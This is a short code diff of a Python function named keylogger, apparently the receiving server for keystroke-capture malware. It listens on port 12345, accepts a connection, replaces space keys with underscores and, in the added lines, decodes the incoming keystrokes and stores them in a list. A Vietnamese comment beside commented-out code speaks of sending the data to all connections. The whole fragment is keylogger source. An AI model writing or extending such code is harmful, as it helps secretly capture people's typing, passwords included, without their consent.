@@ -7,6 +7,7 @@ port = 12345
 def keylogger():
     serverSocket.bind(('', port))
     serverSocket.listen(5)
+    keylogger_data = []
     while True: 
 
         clientSocket, clientAddress = serverSocket.accept()	 
@@ -37,7 +38,12 @@ def keylogger():
                 if data == "Key.space":
                     data = "_"
                 # print(data, end="")
-                return data
+                # return data
+            
+            data = data.decode('utf-8')
+            keylogger_data.append(data) 
+            # # Gửi dữ liệu đến tất cả các kết nối đã thiết lập
+            # clientSocket.sendall(data.encode())
 
         clientSocket.close()
         break
